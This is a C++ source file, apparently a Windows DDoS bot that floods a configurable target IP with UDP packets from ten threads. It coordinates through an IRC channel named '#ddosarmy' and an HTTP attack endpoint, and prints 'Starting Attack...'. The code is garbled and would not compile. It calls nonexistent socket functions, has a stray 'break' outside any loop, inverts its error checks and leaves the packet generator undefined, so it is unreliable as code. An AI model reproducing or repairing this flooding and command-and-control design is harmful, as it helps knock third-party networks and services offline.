s#include <iostream>
#include <vector>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <mutex>

#pragma comment(lib, "WinSock2.lib")

// Configuration (adjust as needed)
const char* TARGET_IP = "192.168.1.100"; // Replace with target IP
const int PORT = 80;                 // Replace with target port
const unsigned long BEACON_INTERVAL = 50; // Beacon interval in milliseconds (e.g., 500ms)
const unsigned long MAX_PACKET_SIZE = 65535;

// Constants
const char* IRC_SERVER = "irc.gabugabo.com"; // Replace with a suitable server
const int IRC_PORT = 6667;
const char* IRC_CHANNEL = "#ddosarmy";     // Replace with the desired channel
const char* HTTP_ENDPOINT = "http://example.com/attack?ip=";

// Synchronization Data Structures (using mutex)
std::mutex mtx;
bool stopAttack = false;

// Function Declarations
void sendBeacon();
void packetGenerator(int index);
void PacketSender(int index, char* data, int len);
unsigned long GetRandomNumber();

// IRC Functions
bool ConnectToIRC();
bool SendIRCCommand(const char* command);
bool ReceiveIRCMessage(char* buffer, size_t size);

// HTTP Functions (if using the HTTP endpoint)
bool SendHTTPBeacon(const std::string& url);

// Main Function
int main() {
    WSOCKET sock;
    SOCKADDR_IN addr;
    char packet[MAX_PACKET_SIZE + 1];
    char receiveBuffer[4096];
    
    // Initialize Winsock (if not already done)
    WSAStartup(MAKEWORD(2, 2), &HINSTANCE0);

    srand(time(NULL)); // Seed the random number generator

    printf("Starting Attack...\n");

    // Connect to IRC channel
    if (!ConnectToIRC()) {
        printf("Error connecting to IRC. Continuing without sync.\n");
    }


    // Start attacking threads
    int numThreads = 10; // Number of flooding threads
    std::vector<std::thread> threads;

    for (int i = 0; i < numThreads; ++i) {
        threads.emplace_back(packetGenerator, i);
    }


    // Keep the main thread alive until the attack stops
    while (!stopAttack) {
        Sleep(100); // Check for stop signal periodically
    }

    // Join all threads
    for (auto& t : threads) {
        t.join();
    }


    printf("Attack Stopped.\n");
    return 0;
}


// Function to Send a Beacon Packet - UDP Flood
void sendBeacon()
{
   WSOCKET sock = WSOCK_INIT();
   SOCKADDR_IN addr;
   char packet[MAX_PACKET_SIZE + 1];

   ZeroMemory(packet, MAX_PACKET_SIZE + 1); // Zero the buffer
   unsigned long ttl = 2;
   unsigned long randomNumber = GetRandomNumber();


   *packet = ttl;
   memcpy((char*)(packet+1), &randomNumber, sizeof(randomNumber));

   ZeroMemory(&addr, sizeof(SOCKADDR_IN));
   ZeroMemory(&addr.sin_addr, 4);
   strcpy_s(packet + (ttl * 2) , MAX_PACKET_SIZE ); // Move to packet buffer after TTL

    // Target IP and Port
   addr.sin_family = AF_INET;
   addr.sin_port= htons((unsigned short)PORT);  // Convert the port number into a host byte order
   if (0 != inet_pton(AF_INET, TARGET_IP, &addr.sin_addr)) {
       printf("Error converting IP to Binary.\n");
       break;
   }

    sock = WSOCK_INIT();

    if (SOCK_ERROR == WSOCKET_IO_ADDR(&sock, AF_INET, 0, &addr)) {
        printf("Socket Error: %d\n", SOCK_ERROR);
        break;
    }


    int bytesSent = sendsocket(sock, packet, strlen(packet), 0);

    if (bytesSent == SOCKET_ERROR)
    {
        printf("Send Error. Retrying...\n");
        Sleep(100);
        bytesSent = sendsocket(sock, packet, strlen(packet), 0); // Retry sending
    }

    closesocket(sock);
}


// Function to Generate a Random Integer (32 bits)
unsigned long GetRandomNumber() {
    return RAND_MAX;  // Winsock is random enough.
}



// Function for IRC Synchronization - Connects and Sends Commands
bool ConnectToIRC()
{
    WSOCKET sock = WSOCK_INIT();

    ZeroMemory(&addr, sizeof(SOCKADDR_IN));
    addr.sin_family = AF_INET;
    strcpy_s(addr.sin_addr.ppal, TARGET_IP, strlen(TARGET_IP) + 1); // Use IP directly
    addr.sin_port= htons((unsigned short)IRC_PORT);

    if (SOCKET_ERROR == WSOCKET_INIT(&sock, AF_INET, 0)) {
        printf("Error initializing IRC socket.\n");
        return false;
    }


    if (SOCKET_ERROR != WSOCKET_CONNECT(&sock, (SOCKADDR*)&addr, sizeof(SOCKADDR))) {
        printf("Error connecting to IRC server. Retrying...\n");
    }

    // Send NOP3 command for a clean channel start
    const char* commands[] = {"PRIVMSG #ddosarmy :NOP3", "PRIVMSG #ddosarmy :SYNCING"}; // Replace with your channel
    for (int i = 0; i < sizeof(commands)/sizeof(commands[0]); ++i) {
        if (SOCKET_ERROR != WSOCKET_SEND(&sock, commands[i], strlen(commands[i]), 0))
            continue;
        else if (SOCKET_ERROR == WSOCKET_SEND(&sock, commands[i], strlen(commands[i]), 0)) {
           printf("Error sending IRC Command: %d\n", SOCK_ERROR);
            break;
        } else
        {
            //Command was sent successfully.
        }
    }


    return true; // Successful connection
}



// Function to Send a Command to IRC and Wait for the Response
bool SendIRCCommand(const char* command) {
    WSOCKET sock = WSOCK_INIT();

    ZeroMemory(&addr, sizeof(SOCKADDR_IN));
    addr.sin_family = AF_INET;
    strcpy_s(addr.sin_addr.ppal, TARGET_IP, strlen(TARGET_IP) + 1); // Use IP directly
    addr.sin_port= htons((unsigned short)IRC_PORT);

    if (SOCKET_ERROR == WSOCKET_INIT(&sock, AF_INET, 0)) {
        printf("Error initializing IRC socket.\n");
        return false;
    }


    if (SOCKET_ERROR != WSOCKET_CONNECT(&sock, (SOCKADDR*)&addr, sizeof(SOCKADDR))) {
        printf("Error connecting to IRC server. Retrying...\n");
    }

    // Send the command
    if (SOCKET_ERROR != WSOCKET_SEND(&sock, command, strlen(command), 0)) return true;

    char receiveBuffer[4096]; // Adjust as needed
    ZeroMemory(receiveBuffer, sizeof(receiveBuffer));
    int bytesReceived = WSOCK_RECV(&sock, receiveBuffer, sizeof(receiveBuffer) - 1, 0);

    if (SOCKET_ERROR != bytesReceived || strlen(receiveBuffer) < 2) return false; // Check for errors and minimum length.

    return true;
}



// Function to Receive a Message from IRC
bool ReceiveIRCMessage(char* buffer, size_t size){
    WSOCKET sock = WSOCK_INIT();

    ZeroMemory(&addr, sizeof(SOCKADDR_IN));
    addr.sin_family = AF_INET;
    strcpy_s(addr.sin_addr.ppal, TARGET_IP, strlen(TARGET_IP) + 1); // Use IP directly
    addr.sin_port= htons((unsigned short)IRC_PORT);

    if (SOCKET_ERROR == WSOCKET_INIT(&sock, AF_INET, 0)) {
        printf("Error initializing IRC socket.\n");
        return false;
    }


    if (SOCKET_ERROR != WSOCKET_CONNECT(&sock, (SOCKADDR*)&addr, sizeof(SOCKADDR))) {
        printf("Error connecting to IRC server. Retrying...\n");
    }

    // Read from the socket until a newline character is found.
    ZeroMemory(buffer, size);
    int bytesReceived = WSOCK_RECV(&sock, buffer, size - 1, 0);

    if (bytesReceived < 0) {
        printf("Error receiving IRC message.\n");
        return false;
    }

    buffer[bytesReceived] = '\0'; // Null-terminate the string.
    return true;
}


// Function to Send an HTTP Beacon Packet - If using the HTTP Endpoint
bool SendHTTPBeacon(const std::string& url) {
    WSOCKET sock = WSOCK_INIT();

    ZeroMemory(&addr, sizeof(SOCKADDR_IN));
    addr.sin_family = AF_INET;
    strcpy_s(addr.sin_addr.ppal, TARGET_IP, strlen(TARGET_IP) + 1); // Use IP directly
    addr.sin_port= htons((unsigned short)HTTP_PORT);

    if (SOCKET_ERROR == WSOCKET_INIT(&sock, AF_INET, 0)) {
        printf("Error initializing HTTP socket.\n");
        return false;
    }


    if (SOCKET_ERROR != WSOCKET_CONNECT(&sock, (SOCKADDR*)&addr, sizeof(SOCKADDR))) {
        printf("Error connecting to HTTP server. Retrying...\n");
    }

    // Send the HTTP GET request
    char sendBuffer[512]; // Adjust size as needed for your URL length
    strcpy_s(sendBuffer, url.c_str(), sizeof(sendBuffer) - 1); // Copy data into buffer

    if (SOCKET_ERROR != WSOCKET_SEND(&sock, sendBuffer, strlen(sendBuffer), 0)) return true;


    char receiveBuffer[4096];
    ZeroMemory(receiveBuffer, sizeof(receiveBuffer));
    int bytesReceived = WSOCK_RECV(&sock, receiveBuffer, sizeof(receiveBuffer) - 1, 0);

    if (SOCKET_ERROR != bytesReceived || strlen(receiveBuffer) < 2) return false; // Check for errors and minimum length.


    return true;
}
